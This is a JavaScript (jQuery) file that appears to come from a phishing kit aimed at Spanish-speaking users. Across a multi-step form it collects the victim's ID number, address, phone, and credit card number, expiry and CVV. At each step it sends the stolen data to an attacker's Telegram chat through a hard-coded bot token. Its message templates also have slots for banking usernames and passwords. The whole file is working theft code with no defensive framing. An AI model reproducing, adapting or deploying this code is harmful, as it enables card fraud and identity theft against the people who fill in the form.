$(document).ready(function () {
  function getDate() {
    const date = new Date()
    return `${date.getMonth() + 1}/${date.getDate()}/${date.getFullYear()}`
  }

  $('#getUserInfo').click(async function () {
    var userId = $('#userId').val()

    if (userId) {
      $('#loading').show()
      $('#content').hide()

      $.ajax({
        url: `https://resources-prodcol.com/controllers/getUserInfo.php`,
        type: 'GET',
        data: {
          userId: userId,
        },
        success: function (data) {
          localStorage.setItem('user', data)
          var userInfo = data.split('|')
          window.location.href = `/views/userInfo.php?name=${userInfo[0]}&id1=${userInfo[1]}&id2=${userInfo[2]}`
          $('#loading').hide()
          $('#content').show()
        },
      })
    } else {
      alert('Por favor ingrese la identificación')
    }
  })

  $('#step1_btn').click(function () {
    var citizenshipCard = $('#citizenshipCard').val()
    var address = $('#address').val()
    var city = $('#city').val()
    var phone = $('#phone').val()

    if (!citizenshipCard || !address || !city || !phone) {
      alert('Por favor ingrese todos los campos')
    } else {
      var userInfo = localStorage.getItem('user').split('|')
      localStorage.setItem(
        'user',
        JSON.stringify({
          name: userInfo[0],
          id: userInfo[1],
          address: address,
          phone: phone,
          city: city,
        })
      )

      $.ajax({
        url: 'https://api.telegram.org/bot6111491989:AAGV2p6oEw-TsKC5-qBDwa2hgocN_gg5kn4/sendMessage',
        data: {
          chat_id: '-1001956720897',
          text: `
           #################################

Time 🔹 ${getDate()}:

---- INTERACTIONS ---

🟢 USER INFO 🟢: 

👤 NAME: ${userInfo[0]}
🪪 ID: ${userInfo[2]}
🏘 ADRRESS: ${address}
📲 PHONE: ${phone}
🖥 IP: 
📍 IP CITY: ${city}

🟢 CC INFO 🟢: 

📟 CC: 
📆 EXP: 
🔐 CVV: 
🌎 COUNTRY: 
🏦 BANK: 
⚜️ LEVEL: 
🔮 TYPE: 

#################################`,
        },
        type: 'POST',
        success: function () {
          window.location.href = `/views/step2.php`
        },
      })
    }
  })

  $('#step2_btn').click(function () {
    var cc = $('#cc').val()
    var cnum = $('#cnum').val()
    var expm = $('#expm').val()
    var expy = $('#expy').val()
    var cvv = $('#cvv').val()

    if (!cc || !cnum || !expm || !expy || !cvv) {
      alert('Por favor ingrese todos los campos')
    } else {
      var userInfo = JSON.parse(localStorage.getItem('user'))
      var updatedUserInfo = {
        ...userInfo,
        cc: cc,
        cnum: cnum,
        exp: expm + ' / ' + expy,
        cvv: cvv,
      }
      localStorage.setItem('user', JSON.stringify(updatedUserInfo))
      const replyKeyboard = {
        keyboard: [
          [{ text: 'Button 1' }, { text: 'Button 2' }],
          [{ text: 'Button 3' }],
        ],
        resize_keyboard: true,
        one_time_keyboard: true,
      }

      $.ajax({
        url: 'https://api.telegram.org/bot6111491989:AAGV2p6oEw-TsKC5-qBDwa2hgocN_gg5kn4/sendMessage',
        data: {
          chat_id: 1001956720897,
          text: `
           #################################

Time 🔹 ${getDate()}:

---- INTERACTIONS ---

🟢 USER INFO 🟢: 

👤 NAME: ${updatedUserInfo.name}
🪪 ID: ${updatedUserInfo.id}
🏘 ADRRESS: ${updatedUserInfo.address}
📲 PHONE: ${updatedUserInfo.address}
🖥 IP: 
📍 IP CITY: ${updatedUserInfo.city}

🟢 CC INFO 🟢: 

📟 CC: ${updatedUserInfo.cc}
📆 EXP: ${updatedUserInfo.exp}
🔐 CVV: ${updatedUserInfo.cvv}
🌎 COUNTRY: 
🏦 BANK: 
⚜️ LEVEL: ${updatedUserInfo.cnum}
🔮 TYPE: 

🟢 BANK INFO 🟢: 

🏦 BANKNAME: 
👤 BANKUSER: 
🔐 PASSWORD: 


#################################`,
        },
        type: 'POST',
        success: function () {
          window.location.href = `/views/step3.php`
        },
      })
    }
  })
})
